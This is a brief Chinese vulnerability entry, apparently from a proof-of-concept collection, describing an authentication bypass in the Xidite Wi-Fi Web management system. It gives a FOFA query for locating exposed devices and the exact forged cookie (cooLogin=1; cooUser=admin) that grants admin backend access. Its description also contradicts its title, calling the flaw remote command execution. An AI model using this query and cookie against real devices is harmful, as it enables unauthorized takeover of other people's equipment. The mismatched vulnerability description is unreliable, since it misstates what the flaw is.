# 西迪特 Wi-Fi Web管理 Cookie 越权访问漏洞


## 漏洞描述


西迪特 Wi-Fi Web管理系统后台过滤不足导致远程命令执行漏洞



## 漏洞影响


```plain
西迪特 Wi-Fi Web管理
```



## FOFA


```plain
title=="Wi-Fi Web管理"
```



## 漏洞复现o


登录页面



![202205191839372.png](/uploads/20260518/dfa0834a-f0b2-4274-a88c-48720c61ed42.png)



添加Cookie，即可登录后台



```plain
Cookie: timestamp=0; cooLogin=1; cooUser=admin
```
